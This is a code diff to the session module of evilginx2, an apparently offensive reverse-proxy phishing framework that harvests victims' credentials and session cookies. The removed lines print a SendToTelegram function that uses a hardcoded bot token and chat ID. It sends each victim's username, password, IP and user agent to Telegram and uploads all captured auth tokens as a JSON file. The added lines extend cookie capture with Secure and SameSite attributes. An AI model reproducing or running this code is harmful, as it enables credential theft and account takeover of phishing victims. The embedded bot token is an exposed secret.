@@ -1,11 +1,9 @@
 package core
 
 import (
-	"encoding/json"
-	"fmt"
-	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
+	"net/http"
+
 	"github.com/kgretzky/evilginx2/database"
-	"strconv"
 )
 
 type Session struct {
@@ -22,6 +20,8 @@ type Session struct {
 	IsForwarded   bool
 	RedirectCount int
 	PhishLure     *Lure
+	WebhookSent   bool
+	ProxyURL      string
 }
 
 func NewSession(name string) (*Session, error) {
@@ -38,6 +38,7 @@ func NewSession(name string) (*Session, error) {
 		IsForwarded:   false,
 		RedirectCount: 0,
 		PhishLure:     nil,
+		ProxyURL:      "",
 	}
 	s.Tokens = make(map[string]map[string]*database.Token)
 
@@ -52,11 +53,11 @@ func (s *Session) SetPassword(password string) {
 	s.Password = password
 }
 
-func (s *Session) SetCustom(name string, value string) {
+func (s *Session) SetCustom(name, value string) {
 	s.Custom[name] = value
 }
 
-func (s *Session) AddAuthToken(domain string, key string, value string, path string, http_only bool, authTokens map[string][]*AuthToken) bool {
+func (s *Session) AddAuthToken(domain, key, value, path string, http_only bool, secure bool, same_site http.SameSite, authTokens map[string][]*AuthToken) bool {
 	if _, ok := s.Tokens[domain]; !ok {
 		s.Tokens[domain] = make(map[string]*database.Token)
 	}
@@ -65,11 +66,15 @@ func (s *Session) AddAuthToken(domain string, key string, value string, path str
 		tk.Value = value
 		tk.Path = path
 		tk.HttpOnly = http_only
+		tk.Secure = secure
+		tk.SameSite = same_site
 	} else {
 		s.Tokens[domain][key] = &database.Token{
 			Name:     key,
 			Value:    value,
 			HttpOnly: http_only,
+			Secure:   secure,
+			SameSite: same_site,
 		}
 	}
 
@@ -84,7 +89,7 @@ func (s *Session) AddAuthToken(domain string, key string, value string, path str
 	}
 
 	for domain, tokens := range s.Tokens {
-		for tk, _ := range tokens {
+		for tk := range tokens {
 			if al, ok := tcopy[domain]; ok {
 				for an, at := range al {
 					match := false
@@ -105,59 +110,5 @@ func (s *Session) AddAuthToken(domain string, key string, value string, path str
 		}
 	}
 
-	if len(tcopy) == 0 {
-		return true
-	}
-	return false
-}
-
-func (s *Session) SendToTelegram() error {
-	// Hardcoded Telegram bot credentials
-	botToken := "6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzAa"
-	chatID := "5822512651"
-
-	chatIDInt, err := strconv.ParseInt(chatID, 10, 64)
-if err != nil {
-    return err
-}
-
-	// Convert session data (excluding tokens) to a string
-	sessionText := fmt.Sprintf("Session ID: %s\nUsername: %s\nPassword: %s\nUser-Agent: %s\nRemote IP: %s",
-		s.Id, s.Username, s.Password, s.Params["User-Agent"], s.Params["Remote-IP"])
-
-	// Create a new Telegram bot
-	bot, err := tgbotapi.NewBotAPI(botToken)
-	if err != nil {
-		return err
-	}
-
-	// Create a message for session data
-	// message := tgbotapi.NewMessage(chatID, sessionText)
-	message := tgbotapi.NewMessage(chatIDInt, sessionText)
-
-	// Send the session data
-	_, err = bot.Send(message)
-	if err != nil {
-		return err
-	}
-
-	// Convert tokens to JSON
-	tokenJSON, err := json.MarshalIndent(s.Tokens, "", "  ")
-	if err != nil {
-		return err
-	}
-
-	// Create a file with JSON data
-	file := tgbotapi.FileBytes{Name: "tokens.json", Bytes: tokenJSON}
-
-	// Create a message for the token file
-	fileMessage := tgbotapi.NewDocument(chatIDInt, file)
-
-	// Send the token file
-	_, err = bot.Send(fileMessage)
-	if err != nil {
-		return err
-	}
-
-	return nil
+	return len(tcopy) == 0
 }
